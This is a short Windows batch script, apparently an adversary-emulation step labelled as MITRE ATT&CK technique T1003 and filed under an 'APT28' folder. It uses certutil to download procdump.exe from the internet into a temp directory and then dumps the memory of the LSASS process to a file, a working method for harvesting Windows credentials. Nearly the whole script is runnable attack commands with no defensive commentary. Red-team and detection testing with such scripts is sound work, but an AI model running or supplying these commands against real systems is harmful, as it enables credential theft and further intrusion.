@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Credential Dumping	(T1003)
ECHO.
ECHO [+] Dumping LSASS memory using 'PROCDUMP'
ECHO -------------------------------------------------------------------
certutil.exe -urlcache -split -f http://live.sysinternals.com/procdump.exe %temp%\APT28\procdump.exe
%temp%\APT28\procdump.exe -accepteula -ma lsass.exe %temp%\APT28\pi-lsass.dmp
ECHO.

